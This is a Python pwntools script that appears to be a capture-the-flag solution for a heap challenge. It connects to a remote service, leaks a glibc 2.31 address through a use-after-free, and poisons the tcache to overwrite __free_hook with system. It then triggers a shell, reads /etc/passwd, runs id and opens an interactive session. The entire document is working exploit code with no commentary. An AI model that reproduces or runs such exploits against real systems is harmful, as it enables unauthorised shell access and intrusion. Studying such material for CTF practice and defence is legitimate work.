#!/usr/bin/env python3

from pwn import *
import random
import string

r = lambda: b"".join(bytes([random.choice(range(0xff))]) for n in range(0xff))

def s():
  a = b"\n"
  while b"\n" in a:
    a = r()
  return a

context.binary = elf = ELF("./vuln")
libc = ELF("./libc-2.31.so")
ld = ELF("./ld-2.31.so")

#conn = process()
conn = remote("eth007.me", 42067)

def alloc(idx, size, stuff):
  conn.sendline(b"b")
  conn.sendlineafter(b"idx:", str(idx).encode())
  conn.sendlineafter(b"size:", str(size).encode())
  conn.sendlineafter(b"internal organs:", stuff)

def free(idx):
  conn.sendline(b"k")
  conn.sendlineafter(b"idx:", str(idx).encode())

def view(idx, lines):
  conn.sendline(b"s")
  conn.sendlineafter(b"idx:", str(idx).encode())
  conn.recvline()
  return conn.recvlines(lines)

def edit(idx, stuff):
  conn.sendline(b"m")
  conn.sendlineafter(b"idx:", str(idx).encode())
  conn.sendlineafter(b"internal organs:", stuff)

for n in range(9):
  alloc(n, 0x100, s())

for n in range(7):
  free(n)

free(7)
libc.address = u64(view(7, 1)[0]+b"\0\0") - 0x1ebbe0
print(hex(libc.address))

edit(6, p64(libc.sym.__free_hook))
alloc(0, 0x100, b"sh\0" + s()[:-3])
alloc(1, 0x100, p64(libc.sym.system) + s()[:-8])
free(0)

conn.sendline(b"head /etc/passwd")
conn.sendline(b"id")

conn.interactive()
